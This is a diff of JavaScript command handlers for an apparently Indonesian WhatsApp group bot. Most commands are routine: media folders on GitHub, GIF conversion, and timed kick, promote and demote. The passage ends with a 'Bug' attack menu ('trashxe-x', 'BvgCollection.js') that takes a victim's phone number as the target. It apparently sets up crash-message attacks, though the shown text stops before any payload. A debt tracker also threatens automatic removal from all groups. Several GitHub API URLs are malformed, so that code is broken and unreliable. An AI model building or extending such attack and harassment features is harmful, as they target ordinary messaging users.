+ name: "single_select", 
+ buttonParamsJson: JSON.stringify({ 
+ title: "FOLDER GRUP INI", 
+ sections: [{ 
+ title: "Auto List", 
+ highlight_label: "𝗝𝗝", 
+ rows: rows.slice(0, 50) 
+ }] 
+ }) 
+ }]
+ })
+ }) // <-- Diperbaiki: Penutupan struktur pesan interaktif yang menggantung
+ }
+ }
+ }, { quoted: m })
+
+ await Asepp.relayMessage(m.chat, msg.message, { messageId: msg.key.id })
+
+ } catch (e) {
+ console.log("FILTERS ERROR:", e)
+ await payreply('❌ Error:\n' + e.message)
+ }
+}
+break
+
+
+case "deljj": {
+ try {
+ if (!isOwner) return payreply('Owner only! 👑')
+ if (!m.isGroup) return payreply('❌ Cuma bisa di grup!')
+
+ if (!text) return payreply(`Contoh:\n${prefix}deljj nika`)
+
+ const axios = require('axios')
+ const fs = require('fs')
+ const path = require('path')
+ const groupId = m.chat
+ const folderName = text.trim().toLowerCase()
+ const dbPath = path.join(process.cwd(), 'database/jj.json')
+
+ if (!fs.existsSync(dbPath)) return payreply('❌ Database jj.json tidak ada!')
+ let db = JSON.parse(fs.readFileSync(dbPath))
+
+ if (!db[groupId] || !db[groupId][folderName]) {
+ return payreply(`❌ Folder *${folderName}* tidak ditemukan di grup ini!`)
+ }
+
+ const mediaList = db[groupId][folderName]
+ await payreply(`⏳ Menghapus folder *${folderName}* dan ${mediaList.length} file di GitHub...`)
+
+ const GITHUB_OWNER = "AsepXyz12"
+ const GITHUB_REPO = "bot-wa-db"
+
+ // Loop hapus file di github satu per satu berdasarkan database
+ for (const media of mediaList) {
+ try {
+ const githubPath = `jj/${groupId}/${folderName}/${media.file}`
+ 
+ // Ambil SHA file dulu sebelum didelete (syarat GitHub API)
+ const getFile = await axios.get(`https://github.com{GITHUB_OWNER}/${GITHUB_REPO}/contents/${githubPath}`, {
+ })
+ 
+ const sha = getFile.data.sha
+ 
+ // Eksekusi delete file di repo github
+ await axios.delete(`https://github.com{GITHUB_OWNER}/${GITHUB_REPO}/contents/${githubPath}`, {
+ data: {
+ message: `Delete ${media.file} via bot`,
+ sha: sha
+ }
+ })
+ } catch (err) {
+ console.log(`Gagal hapus file ${media.file} di GitHub (Mungkin sudah tidak ada)`)
+ }
+ }
+
+ // Hapus data folder dari database lokal
+ delete db[groupId][folderName]
+ fs.writeFileSync(dbPath, JSON.stringify(db, null, 2))
+
+ await payreply(`\`𝗗𝗘𝗟𝗝𝗝 𝗦𝗨𝗖𝗖𝗘𝗦𝗦\`
+
+Folder *${folderName}* beserta seluruh datanya di grup ini telah berhasil dihapus dari database dan GitHub! Clean ✨`)
+
+ } catch (e) {
+ console.log("DELJJ ERROR:", e)
+ await payreply('❌ Error:\n' + e.message)
+ }
+}
+break
+
+case "jj": {
+ try {
+ 
+ if (!m.isGroup) return payreply('❌ Cuma bisa di grup!')
+
+ const fs = require('fs')
+ const path = require('path')
+ const GITHUB_OWNER = "AsepXyz12"
+ const GITHUB_REPO = "bot-wa-db"
+ const groupId = m.chat
+
+ if (!text) return payreply(`Contoh:\n${prefix}jj nika\nKetik ${prefix}filters buat liat list grup ini`)
+
+ const folderName = text.trim().toLowerCase()
+ const dbPath = path.join(process.cwd(), 'database/jj.json')
+
+ if (!fs.existsSync(dbPath)) return payreply('❌ Database jj.json tidak ada!')
+ let db = JSON.parse(fs.readFileSync(dbPath))
+
+ if (!db[groupId] || !db[groupId][folderName]) {
+ return payreply(`❌ Folder *${folderName}* gak ada di grup ini!\n\nKetik ${prefix}filters buat liat list`)
+ }
+ if (db[groupId][folderName].length === 0) return payreply(`❌ Folder *${folderName}* kosong!`)
+
+ const mediaList = db[groupId][folderName]
+ await payreply(`⏳ Kirim ${mediaList.length} media dari folder *${folderName}* grup ini...`)
+
+ let success = 0
+ for (const media of mediaList) {
+ try {
+ const rawUrl = `https://raw.githubusercontent.com/${GITHUB_OWNER}/${GITHUB_REPO}/main/jj/${groupId}/${folderName}/${media.file}`
+
+ if (media.type === 'image') await Asepp.sendMessage(m.chat, { image: { url: rawUrl } }, { quoted: m })
+ else if (media.type === 'video') await Asepp.sendMessage(m.chat, { video: { url: rawUrl } }, { quoted: m })
+ else if (media.type === 'audio') await Asepp.sendMessage(m.chat, { audio: { url: rawUrl }, mimetype: media.mime }, { quoted: m })
+ else await Asepp.sendMessage(m.chat, { document: { url: rawUrl }, mimetype: media.mime, fileName: media.file }, { quoted: m })
+
+ success++
+ await new Promise(r => setTimeout(r, 1500))
+ } catch {}
+ }
+
+ await payreply(`\`𝗝𝗝 𝗗𝗢𝗡𝗘\`
+
+Folder *${folderName}* grup ini\nTerkirim: ${success}/${mediaList.length}`)
+
+ } catch (e) {
+ console.log("JJ ERROR:", e)
+ await payreply('❌ Error:\n' + e.message)
+ }
+}
+break
+
+
+
+
+
+
+
+
+
+
+
+
+case "togif":
+case "gif": {
+ try {
+ const fs = require("fs")
+ const { exec } = require("child_process")
+ const path = require("path")
+
+ let isQuotedVideo = m.quoted && /video/.test(m.quoted.mimetype || "")
+ let isDirectVideo = /video/.test(m.mimetype || "")
+
+ if (!isQuotedVideo && !isDirectVideo) {
+ return payreply("❌ Kirim/reply video terlebih dahulu")
+ }
+
+ let mediaTarget = isQuotedVideo ? m.quoted : m
+
+ await Asepp.sendMessage(m.chat, {
+ react: { text: "⏳", key: m.key }
+ })
+
+ let videoBuffer = await mediaTarget.download()
+ if (!videoBuffer) return payreply("❌ Gagal download video")
+
+ const tmpMp4 = path.join(__dirname, `gif_${Date.now()}.mp4`)
+ const tmpGif = path.join(__dirname, `gif_${Date.now()}.gif`)
+
+ fs.writeFileSync(tmpMp4, videoBuffer)
+
+ exec(
+ `ffmpeg -i "${tmpMp4}" -vf "fps=15,scale=480:-1:flags=lanczos" -loop 0 "${tmpGif}" -y`,
+ async (err) => {
+ try {
+ if (err) {
+ console.log(err)
+ return payreply("❌ Gagal convert ke GIF")
+ }
+
+ const gifBuffer = fs.readFileSync(tmpGif)
+
+ await Asepp.sendMessage(
+ m.chat,
+ {
+ document: gifBuffer,
+ mimetype: "image/gif",
+ fileName: "trinity.gif",
+ caption: "✅ Berhasil convert ke GIF"
+ },
+ { quoted: m }
+ )
+
+ fs.unlinkSync(tmpMp4)
+ fs.unlinkSync(tmpGif)
+
+ await Asepp.sendMessage(m.chat, {
+ react: { text: "✅", key: m.key }
+ })
+
+ } catch (e) {
+ console.log(e)
+ payreply("❌ Error saat mengirim GIF")
+ }
+ }
+ )
+
+ } catch (err) {
+ console.log(err)
+ payreply(`❌ ${err.message}`)
+ }
+}
+break
+
+
+
+
+case "delutang": {
+    try {
+        let id = parseInt(q)
+        if (!id) return payreply("Format:.delutang ID\nContoh:.delutang 1781000228204\nLihat ID pake.getidut")
+
+        let data = loadUtang()
+        let index = data.findIndex(v => v.id === id)
+        if (index === -1) return payreply("ID tidak ditemukan")
+
+        let target = data[index].target
+        data.splice(index, 1) // HAPUS BENERAN DARI ARRAY
+        saveUtang(data)
+
+        await Asepp.sendMessage(m.chat, {
+            text: `🗑️ UTANG DIHAPUS\nID: ${id}\n👤 Target: @${target.split("@")[0]}\nData dihapus permanen dari database. Aman ga ke-kick.`,
+            mentions: [target]
+        }, { quoted: m })
+
+    } catch (e) {
+        console.log(e)
+        payreply("Error: " + e.message)
+    }
+}
+break
+
+case "listutang": {
+ try {
+ let data = loadUtang()
+ if (data.length === 0) return payreply("Belum ada data utang")
+
+ let list = data.map(v =>
+ `ID: ${v.id}\nTarget: @${v.target.split("@")[0]}\nTanggal: ${v.tanggal}\nStatus: ${v.lunas? 'Lunas' : v.notified? 'Jatuh tempo' : 'Belum jatuh tempo'}`
+ ).join('\n\n---\n\n')
+
+ await Asepp.sendMessage(m.chat, {
+ text: `📋 DAFTAR UTANG\n${list}`,
+ mentions: data.map(v => v.target)
+ })
+ } catch (e) {
+ payreply("Error: " + e.message)
+ }
+}
+break
+
+
+
+case "delkon": {
+ try {
+ const fs = require("fs")
+ const dbFile = "./database/kontak.json"
+ let nomor = q.replace(/\D/g, "")
+ if (!nomor) return payreply("Format:.delkon 628xxx")
+
+ if (!nomor.startsWith('62')) nomor = '62' + nomor.replace(/^0/, '')
+ let jid = nomor + "@s.whatsapp.net"
+
+ let data = JSON.parse(fs.readFileSync(dbFile, "utf-8"))
+ let before = data.length
+ data = data.filter(v => v.jid!== jid)
+
+ if (data.length === before) return payreply("Kontak tidak ditemukan")
+
+ fs.writeFileSync(dbFile, JSON.stringify(data, null, 2))
+ payreply(`✅ Kontak ${nomor} dihapus`)
+ } catch (e) {
+ payreply("Error: " + e.message)
+ }
+}
+break
+
+
+
+
+case "svkon": {
+ try {
+ const fs = require("fs")
+ const dbFolder = "./database"
+ const dbFile = "./database/kontak.json"
+
+ if (!fs.existsSync(dbFolder)) fs.mkdirSync(dbFolder, { recursive: true })
+ if (!fs.existsSync(dbFile)) fs.writeFileSync(dbFile, "[]", "utf-8")
+
+ let text = q || ""
+ 
+ // Pengecekan format dasar
+ if (!m.quoted && (!m.mentionedJid || !m.mentionedJid[0]) && !text.includes("|")) {
+ return payreply("Format: .svkon @tag | Nama atau reply chat ketik .svkon | Nama")
+ }
+
+ let targetRaw = ""
+ let nama = ""
+
+ if (text.includes("|")) {
+ let [raw, namePart] = text.split("|").map(v => v.trim())
+ targetRaw = raw
+ nama = namePart
+ } else {
+ nama = text.trim()
+ }
+
+ // Ambil target JID (Prioritas: Reply > Tag > Nomor Manual)
+ let target = null
+ if (m.quoted) {
+ target = m.quoted.sender
+ } else if (m.mentionedJid && m.mentionedJid[0]) {
+ target = m.mentionedJid[0]
+ } else if (targetRaw) {
+ let nomor = targetRaw.replace(/\D/g, "")
+ if (!nomor) return payreply("Nomor target kagak valid, Bos!")
+ if (!nomor.startsWith('62')) nomor = '62' + nomor.replace(/^0/, '')
+ target = nomor + "@s.whatsapp.net"
+ }
+
+ if (!target) return payreply("Tag, reply, atau masukin nomor target!")
+ if (!nama) return payreply("Nama kontaknya wajib diisi!")
+
+ let nomor = target.split("@")[0]
+
+ // ==========================================
+ // CELAH BYPASS: LANGSUNG GEBRES KE SERVER WA
+ // ==========================================
+ // Trik 1: Paksa push update chat person ke memori WhatsApp Web socket
+ await Asepp.chatModify({
+ archive: false,
+ lastMessages: [{ key: { remoteJid: target, fromMe: false }, messageTimestamp: Date.now() }]
+ }, target).catch(() => {})
+
+ // Trik 2: Tembak event emisi internal Baileys agar mematangkan sinkronisasi nama JID baru
+ Asepp.ev.emit('contacts.upsert', [{ id: target, name: nama, notify: nama, verifiedName: nama }])
+ Asepp.ev.emit('contacts.update', [{ id: target, name: nama, notify: nama }])
+
+ // ==========================================
+ // SIMPAN KE DATABASE INTERNAL BOT
+ // ==========================================
+ let data = []
+ try {
+ let raw = fs.readFileSync(dbFile, "utf-8").trim()
+ if (raw) data = JSON.parse(raw)
+ } catch {
+ data = []
+ }
+
+ let exist = data.find(v => v.jid === target)
+ if (exist) {
+ exist.nama = nama
+ exist.updated = Date.now()
+ } else {
+ data.push({ jid: target, nomor, nama, dibuat: Date.now(), updated: Date.now() })
+ }
+ fs.writeFileSync(dbFile, JSON.stringify(data, null, 2))
+
+ // Feedback langsung tag orangnya pake nama baru
+ await Asepp.sendMessage(m.chat, {
+ text: `🎯 BYPASS BERHASIL!\n\nKontak langsung disuntik ke server WA:\n👤 Nama: ${nama}\n📱 Nomor: @${nomor}\n\nCek di chat utama/kontak lu sekarang!`,
+ mentions: [target]
+ }, { quoted: m })
+
+ } catch (e) {
+ console.log(e)
+ payreply("Error Bypass: " + e.message)
+ }
+}
+break
+
+
+
+
+
+case "getidut":
+case "idutang": {
+ try {
+ const fs = require("fs")
+ const dbFile = "./database/utang.json"
+ if (!fs.existsSync(dbFile)) return payreply("Belum ada data utang")
+
+ let target = null
+ if (m.quoted) {
+ target = m.quoted.sender
+ } else if (m.mentionedJid && m.mentionedJid[0]) {
+ target = m.mentionedJid[0]
+ } else if (q) {
+ let nomor = q.replace(/\D/g, "")
+ if (!nomor) return payreply("Nomor tidak valid")
+ if (!nomor.startsWith('62')) nomor = '62' + nomor.replace(/^0/, '')
+ target = nomor + "@s.whatsapp.net"
+ }
+
+ if (!target) {
+ return payreply(
+`Format:
+.getidut @tag
+.getidut 628xxx
+(reply chat orang/target)`
+ )
+ }
+
+ let data = JSON.parse(fs.readFileSync(dbFile, "utf-8").trim() || "[]")
+
+ // Ambil semua utang target di chat ini
+ let utangTarget = data.filter(v => v.target === target && v.chat === m.chat)
+
+ if (utangTarget.length === 0) {
+ return payreply(`@${target.split("@")[0]} belum punya utang di grup ini`, [target])
+ }
+
+ let text = `🆔 ID UTANG @${target.split("@")[0]}\n\n`
+
+ utangTarget.forEach((v, i) => {
+ let status = v.lunas? '✅ Lunas' : v.notified? '⚠️ Jatuh tempo' : '⏳ Aktif'
+ text += `${i+1}. ID: ${v.id}\n📅 Jatuh Tempo: ${v.tanggal}\n📊 Status: ${status}\n\n`
+ })
+
+ text += `💡 Salin ID nya buat.nambahmek [ID] | 1h\n💡 Atau.delutang [ID] buat lunasin`
+
+ await Asepp.sendMessage(m.chat, { text, mentions: [target] }, { quoted: m })
+
+ } catch (e) {
+ console.log(e)
+ payreply("Error: " + e.message)
+ }
+}
+break
+
+
+case "addutang": {
+ try {
+ const fs = require("fs")
+ const dbFolder = "./database"
+ const dbFile = "./database/utang.json"
+
+ if (!fs.existsSync(dbFolder)) fs.mkdirSync(dbFolder, { recursive: true })
+ if (!fs.existsSync(dbFile)) fs.writeFileSync(dbFile, "[]", "utf-8")
+
+ let text = q || ""
+ if (!text.includes("|")) {
+ return payreply(
+`Format:
+.addutang @tag 50rb utang rokok | 03-06-2026 14:30
+.addutang 628xxxx 100rb | 03-06-2026 14:30
+Format tanggal: DD-MM-YYYY HH:mm`
+ )
+ }
+
+ let [targetRaw, tanggalJam] = text.split("|").map(v => v.trim())
+ let regexTanggalJam = /^\d{2}-\d{2}-\d{4} \d{2}:\d{2}$/
+ if (!regexTanggalJam.test(tanggalJam)) {
+ return payreply("Format tanggal harus DD-MM-YYYY HH:mm\nContoh: 16-06-2026 14:30")
+ }
+
+ let target = null
+ if (m.quoted) {
+ target = m.quoted.sender
+ } else if (m.mentionedJid && m.mentionedJid[0]) {
+ target = m.mentionedJid[0]
+ } else if (targetRaw) {
+ let nomor = targetRaw.replace(/\D/g, "")
+ if (!nomor) return payreply("Nomor tidak valid")
+ if (!nomor.startsWith('62')) nomor = '62' + nomor.replace(/^0/, '')
+ target = nomor + "@s.whatsapp.net"
+ }
+
+ if (!target) return payreply("Tag, reply, atau masukkan nomor target")
+
+ // Parse tanggal + jam ke timestamp
+ let [tgl, jam] = tanggalJam.split(" ")
+ let [d, mo, y] = tgl.split("-").map(Number)
+ let [h, mi] = jam.split(":").map(Number)
+ let waktuMs = new Date(y, mo - 1, d, h, mi).getTime()
+
+ let data = loadUtang()
+ let newId = Date.now()
+ data.push({
+ id: newId,
+ chat: m.chat,
+ target,
+ tanggal: tgl,
+ jam: jam,
+ waktuMs: waktuMs, // <-- ini buat hitung mundur
+ notified: false,
+ lunas: false,
+ waktuTag: null,
+ dibuat: Date.now(),
+ creator: m.sender
+ })
+
+ saveUtang(data)
+
+ await Asepp.sendMessage(m.chat, {
+ text: `✅ UTANG DICAT\n👤 Target: @${target.split("@")[0]}\n📅 Jatuh Tempo: ${tgl} ${jam} WIB\nID: ${newId}\n\n⚠️ Kalo 10 menit ga.delutang ${newId} = AUTO KICK SEMUA GRUP.`,
+ mentions: [target]
+ }, { quoted: m })
+
+ } catch (e) {
+ console.log(e)
+ payreply("Error: " + e.message)
+ }
+}
+break
+
+case "nambahmek": {
+ try {
+ let [idRaw, tambahRaw] = q.split("|").map(v => v.trim())
+ let id = parseInt(idRaw)
+ if (isNaN(id)) return payreply("ID harus angka")
+
+ let menitTambah = 0
+ let jamMatch = tambahRaw.match(/(\d+)j/)
+ let hariMatch = tambahRaw.match(/(\d+)h/)
+ let menitMatch = tambahRaw.match(/(\d+)m/)
+ if (jamMatch) menitTambah += parseInt(jamMatch[1]) * 60
+ if (hariMatch) menitTambah += parseInt(hariMatch[1]) * 24 * 60
+ if (menitMatch) menitTambah += parseInt(menitMatch[1])
+
+ let data = loadUtang()
+ let item = data.find(v => v.id === id &&!v.lunas)
+ if (!item) return payreply("ID tidak ditemukan atau udah lunas")
+
+ // Upgrade data lama yg ga ada waktuMs
+ if (!item.waktuMs) {
+ let [d, mo, y] = item.tanggal.split("-").map(Number)
+ item.waktuMs = new Date(y, mo - 1, d, 0, 0).getTime()
+ }
+
+ let waktuBaru = new Date(item.waktuMs + menitTambah * 60000)
+ item.waktuMs = waktuBaru.getTime()
+ item.tanggal = waktuBaru.toLocaleDateString('id-ID', {timeZone: 'Asia/Jakarta', day: '2-digit', month: '2-digit', year: 'numeric'}).replace(/\//g, '-')
+ item.jam = waktuBaru.toLocaleTimeString('id-ID', {timeZone: 'Asia/Jakarta', hour: '2-digit', minute: '2-digit'})
+ item.notified = false
+ item.waktuTag = null
+
+ saveUtang(data)
+
+ payreply(`✅ DITAMBAH\n@${item.target.split("@")[0]}\n📅 Baru: ${item.tanggal} ${item.jam} WIB\n⏱ +${tambahRaw}\nID: ${item.id}`, [item.target])
+ } catch (e) {
+ payreply("Error: " + e.message)
+ }
+}
+break
+
+case "minmek": {
+ try {
+ let [idRaw, kurangRaw] = q.split("|").map(v => v.trim())
+ let id = parseInt(idRaw)
+ if (isNaN(id)) return payreply("ID harus angka")
+
+ let menitKurang = 0
+ let jamMatch = kurangRaw.match(/(\d+)j/)
+ let hariMatch = kurangRaw.match(/(\d+)h/)
+ let menitMatch = kurangRaw.match(/(\d+)m/)
+ if (jamMatch) menitKurang += parseInt(jamMatch[1]) * 60
+ if (hariMatch) menitKurang += parseInt(hariMatch[1]) * 24 * 60
+ if (menitMatch) menitKurang += parseInt(menitMatch[1])
+
+ let data = loadUtang()
+ let item = data.find(v => v.id === id &&!v.lunas)
+ if (!item) return payreply("ID tidak ditemukan")
+
+ if (!item.waktuMs) {
+ let [d, mo, y] = item.tanggal.split("-").map(Number)
+ item.waktuMs = new Date(y, mo - 1, d, 0, 0).getTime()
+ }
+
+ let waktuBaru = new Date(item.waktuMs - menitKurang * 60000)
+ item.waktuMs = waktuBaru.getTime()
+ item.tanggal = waktuBaru.toLocaleDateString('id-ID', {timeZone: 'Asia/Jakarta', day: '2-digit', month: '2-digit', year: 'numeric'}).replace(/\//g, '-')
+ item.jam = waktuBaru.toLocaleTimeString('id-ID', {timeZone: 'Asia/Jakarta', hour: '2-digit', minute: '2-digit'})
+ item.notified = false
+ item.waktuTag = null
+
+ saveUtang(data)
+
+ payreply(`✅ DIKURANGI\n@${item.target.split("@")[0]}\n📅 Baru: ${item.tanggal} ${item.jam} WIB\n⏱ -${kurangRaw}\nID: ${item.id}`, [item.target])
+ } catch (e) {
+ payreply("Error: " + e.message)
+ }
+}
+break
+
+case "kickcd":
+case "kikcd":
+case "dorcd": {
+ if (!m.isGroup) return payreply(mess.group)
+
+ // List owner yang dilindungi
+ const ownerList = [
+ "62881036109288@s.whatsapp.net",
+ "6288994486449@s.whatsapp.net",
+ "818082606330@s.whatsapp.net"
+ ]
+
+ if (!m.quoted &&!m.mentionedJid?.length &&!text)
+ return payreply("Reply / tag orang + kasih waktu.\nContoh:.kickcd @user 1mnt 20dtk")
+
+ let users
+ let timeStr = text
+
+ if (m.quoted) {
+ users = m.quoted.sender
+ timeStr = text
+ } else if (m.mentionedJid.length > 0) {
+ users = m.mentionedJid[0]
+ timeStr = text.replace(/@\d+/g, '').trim()
+ } else {
+ let split = text.split(/ (.+)/)
+ users = split[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net'
+ timeStr = split[1] || ""
+ }
+
+ // Proteksi owner
+ if (ownerList.includes(users)) {
+ return payreply("❌ Ga bisa kick owner bot bro")
+ }
+
+ // Fungsi parse waktu
+ function parseTime(str) {
+ if (!str) return null
+ let ms = 0
+ let jam = str.match(/(\d+)\s*j(?:am|m)/i)
+ let menit = str.match(/(\d+)\s*m(?:enit|nt)/i)
+ let detik = str.match(/(\d+)\s*d(?:etik|tk|s)/i)
+
+ if (jam) ms += parseInt(jam[1]) * 3600000
+ if (menit) ms += parseInt(menit[1]) * 60000
+ if (detik) ms += parseInt(detik[1]) * 1000
+
+ return ms > 0? ms : null
+ }
+
+ let delay = parseTime(timeStr)
+ if (!delay) return payreply("⚠️ Format waktu salah!\nContoh: `1jm 2mnt 30dtk` / `1mnt 20dtk` / `50dtk`")
+
+ let maxDelay = 300000 // 5 menit max
+ if (delay > maxDelay) return payreply("⚠️ Max delay 5 menit aja")
+
+ let detik = Math.floor(delay / 1000)
+ let nomor = users.split('@')[0]
+
+ payreply(`⚠️ @${nomor} akan dikeluarkan dalam ${detik} detik...`, {
+ mentions: [users]
+ })
+
+ setTimeout(async () => {
+ try {
+ await Asepp.groupParticipantsUpdate(m.chat, [users], 'remove')
+ payreply(`✅ @${nomor} berhasil dikeluarkan`, {
+ mentions: [users]
+ })
+ } catch (err) {
+ console.log(err)
+ payreply("❌ Gagal kick user")
+ }
+ }, delay)
+}
+break
+
+case "promotecd":
+case "promcd":
+case "naikcd": {
+ if (!m.isGroup) return payreply(mess.group)
+
+ // List owner yang BOLEH dipromote
+ const ownerList = [
+ "62881036109288@s.whatsapp.net",
+ "6288994486449@s.whatsapp.net",
+ "818082606330@s.whatsapp.net"
+ ]
+ let botJid = Asepp.user.id.split(':')[0] + '@s.whatsapp.net'
+
+ if (!m.quoted &&!m.mentionedJid?.length &&!text)
+ return payreply("Tag/reply/number + kasih waktu.\nContoh:.promotecd @user 1mnt 20dtk")
+
+ let target
+ let timeStr = text
+
+ if (m.quoted) {
+ target = m.quoted.sender
+ timeStr = text
+ } else if (m.mentionedJid.length > 0) {
+ target = m.mentionedJid[0]
+ timeStr = text.replace(/@\d+/g, '').trim()
+ } else {
+ let split = text.split(/ (.+)/)
+ target = split[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net'
+ timeStr = split[1] || ""
+ }
+
+ if (target === botJid) return payreply("❌ Bot udah admin bro")
+
+ // Promote HANYA untuk 3 nomor owner
+ if (!ownerList.includes(target)) {
+ return payreply("❌ Promote cuma bisa buat 3 nomor owner bot doang bro")
+ }
+
+ // Fungsi parse waktu
+ function parseTime(str) {
+ if (!str) return null
+ let ms = 0
+ let jam = str.match(/(\d+)\s*j(?:am|m)/i)
+ let menit = str.match(/(\d+)\s*m(?:enit|nt)/i)
+ let detik = str.match(/(\d+)\s*d(?:etik|tk|s)/i)
+
+ if (jam) ms += parseInt(jam[1]) * 3600000
+ if (menit) ms += parseInt(menit[1]) * 60000
+ if (detik) ms += parseInt(detik[1]) * 1000
+
+ return ms > 0? ms : null
+ }
+
+ let delay = parseTime(timeStr)
+ if (!delay) return payreply("⚠️ Format waktu salah!\nContoh: `1jm 2mnt 30dtk` / `1mnt 20dtk` / `50dtk`")
+
+ let maxDelay = 300000
+ if (delay > maxDelay) return payreply("⚠️ Max delay 5 menit aja")
+
+ let detik = Math.floor(delay / 1000)
+ let nomor = target.split('@')[0]
+
+ payreply(`⚠️ @${nomor} akan dijadiin admin dalam ${detik} detik...`, {
+ mentions: [target]
+ })
+
+ setTimeout(async () => {
+ try {
+ await Asepp.groupParticipantsUpdate(m.chat, [target], "promote")
+ payreply(`✅ @${nomor} berhasil dijadiin admin`, {
+ mentions: [target]
+ })
+ } catch (err) {
+ console.log(err)
+ payreply("❌ Gagal promote")
+ }
+ }, delay)
+}
+break
+
+case "demotecd":
+case "democd":
+case "turuncd": {
+ if (!m.isGroup) return payreply(mess.group)
+
+ // List owner yang GABOLEH di-demote
+ const ownerList = [
+ "62881036109288@s.whatsapp.net",
+ "6288994486449@s.whatsapp.net",
+ "818082606330@s.whatsapp.net"
+ ]
+ let botJid = Asepp.user.id.split(':')[0] + '@s.whatsapp.net'
+
+ if (!m.quoted &&!m.mentionedJid?.length &&!text)
+ return payreply("Tag/reply/number + kasih waktu.\nContoh:.demotecd @user 1mnt 20dtk")
+
+ let target
+ let timeStr = text
+
+ if (m.quoted) {
+ target = m.quoted.sender
+ timeStr = text
+ } else if (m.mentionedJid.length > 0) {
+ target = m.mentionedJid[0]
+ timeStr = text.replace(/@\d+/g, '').trim()
+ } else {
+ let split = text.split(/ (.+)/)
+ target = split[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net'
+ timeStr = split[1] || ""
+ }
+
+ if (target === botJid) return payreply("❌ Gak bisa demote bot")
+
+ // Demote GABOLEH untuk 3 nomor owner
+ if (ownerList.includes(target)) {
+ return payreply("❌ Ga bisa demote 3 nomor owner bot bro")
+ }
+
+ // Fungsi parse waktu
+ function parseTime(str) {
+ if (!str) return null
+ let ms = 0
+ let jam = str.match(/(\d+)\s*j(?:am|m)/i)
+ let menit = str.match(/(\d+)\s*m(?:enit|nt)/i)
+ let detik = str.match(/(\d+)\s*d(?:etik|tk|s)/i)
+
+ if (jam) ms += parseInt(jam[1]) * 3600000
+ if (menit) ms += parseInt(menit[1]) * 60000
+ if (detik) ms += parseInt(detik[1]) * 1000
+
+ return ms > 0? ms : null
+ }
+
+ let delay = parseTime(timeStr)
+ if (!delay) return payreply("⚠️ Format waktu salah!\nContoh: `1jm 2mnt 30dtk` / `1mnt 20dtk` / `50dtk`")
+
+ let maxDelay = 300000
+ if (delay > maxDelay) return payreply("⚠️ Max delay 5 menit aja")
+
+ let detik = Math.floor(delay / 1000)
+ let nomor = target.split('@')[0]
+
+ payreply(`⚠️ @${nomor} akan diturunin jadi member dalam ${detik} detik...`, {
+ mentions: [target]
+ })
+
+ setTimeout(async () => {
+ try {
+ await Asepp.groupParticipantsUpdate(m.chat, [target], "demote")
+ payreply(`✅ @${nomor} berhasil diturunin jadi member`, {
+ mentions: [target]
+ })
+ } catch (err) {
+ console.log(err)
+ payreply("❌ Gagal demote")
+ }
+ }, delay)
+}
+break
+
+
+
+
+case "xbvgsg22": {
+ const bak = "\n`./BvgCollection.js`\n⧉ trashxe-x *62xxx*\n└── › *Menampilkan Button Bvg Pilihan*\n\n*# ©./AseppXyzOkeGas*\n";
+ const bakgb = "\n`./BugGroupVault.js`\n⧉ xe-gc 𝐆𝐂𝐒𝐞𝐥𝐞𝐜𝐭\n└── › *Menampilkan Selected Group Dan Button Bvg*\n\n*# ©./AseppXyzOkeGas*\n";
+
+ ButBugMenu(bak, bakgb);
+
+ const input = "./Startt.opus";
+ const output = path.join(__dirname, "./tmp_convert_" + Date.now() + ".ogg");
+
+ if (fs.existsSync(input)) {
+ try {
+ await new Promise((resolve, reject) => {
+ exec(
+ `ffmpeg -y -i ${input} -vn -map_metadata -1 -ac 1 -ar 48000 -c:a libopus -b:a 64k ${output}`,
+ err => (err ? reject(err) : resolve())
+ );
+ });
+
+ await Asepp.sendMessage(
+ m.chat,
+ {
+ audio: fs.readFileSync(output),
+ mimetype: "audio/ogg; codecs=opus",
+ ptt: true,
+ contextInfo: {
+ forwardingScore: 0,
+ isForwarded: false
+ }
+ },
+{ quoted: m }
+ );
+ } catch (e) {
+ console.error(e);
+ } finally {
+ if (fs.existsSync(output)) fs.unlinkSync(output);
+ }
+ }
+
+ await sleep(800);
+
+ await Asepp.relayMessage(
+ m.chat,
+ {
+ stickerMessage: {
+ url: "https://mmg.whatsapp.net/v/t62.15575-24/596273592_972691472004651_8072474425488413201_n.enc?ccb=11-4&oh=01_Q5Aa4QEYWBMly-ejV76uTAzXIPBU_Fhh731teL7pAtoinKu6qA&oe=6A0C3E7E&_nc_sid=5e03e0&mms3=true",
+ fileSha256: Buffer.from("QEayoZ+vQCAn+YLKj7Rotg3QKP0DF6yKrexoQ+W7Fuc=", "base64"),
+ fileEncSha256: Buffer.from("T42LwpXLbsuvRawyH8PoZyHa/3hdHVWJjsos48+Homs=", "base64"),
+ mediaKey: Buffer.from("7byD1ECaC7LvRKXFl5qSx/JDB7tM5YR5k+3kw+adnHU=", "base64"),
+ mimetype: "image/webp",
+ height: 64,
+ width: 64,
+ directPath: "/v/t62.15575-24/596273592_972691472004651_8072474425488413201_n.enc?ccb=11-4&oh=01_Q5Aa4QEYWBMly-ejV76uTAzXIPBU_Fhh731teL7pAtoinKu6qA&oe=6A0C3E7E&_nc_sid=5e03e0",
+ fileLength: "396144",
+ mediaKeyTimestamp: "1776438879",
+ isAnimated: true
+ }
+ },
+ { messageId: m.key.id }
+ );
+}
+break;
+break
+
+case "trashxe-x": {
+  if (!q) {
+    return payreply("[ Pilih Target Terlebih Dahulu ]\n\n▢ Contoh Penggunaan\n└─ › .attack nomor target")
+  }
+  
+  let jidx = q.replace(new RegExp("[^0-9]", "g"), "");
+  if (jidx.startsWith("0")) {
+    return payreply("— ex: 62xxx !!")
+  }
+  
+  let target = "" + jidx + "@s.whatsapp.net";
+  
+  const { prepareWAMessageMedia } = require("@whiskeysockets/baileys");
+  
+  let media = await prepareWAMessageMedia({
+    image: {
+      url: "https://raw.githubusercontent.com/AsepXyz12/bot-wa-db/main/uploads/1781103776855.jpeg"
+    }
+  }, {
+    upload: Asepp.waUploadToServer
+  });
+  
+  await Asepp.relayMessage(m.chat, {
+    interactiveMessage: {
+      header: {
+        hasMediaAttachment: false
+      },
+      body: {
+        text: "Klik Button Untuk Menu Bug"
+      },
+      carouselMessage: {
+        cards: [{
+          header: {
+            imageMessage: media.imageMessage,
+            hasMediaAttachment: true
+          },
+          body: {
+            text: "⨂ target: " + jidx
+          },
+          nativeFlowMessage: {
+            buttons: [{
+              name: "single_select",
+              buttonParamsJson: JSON.stringify({
+                title: " ",
+                icon: "DEFAULT",
+                sections: [{
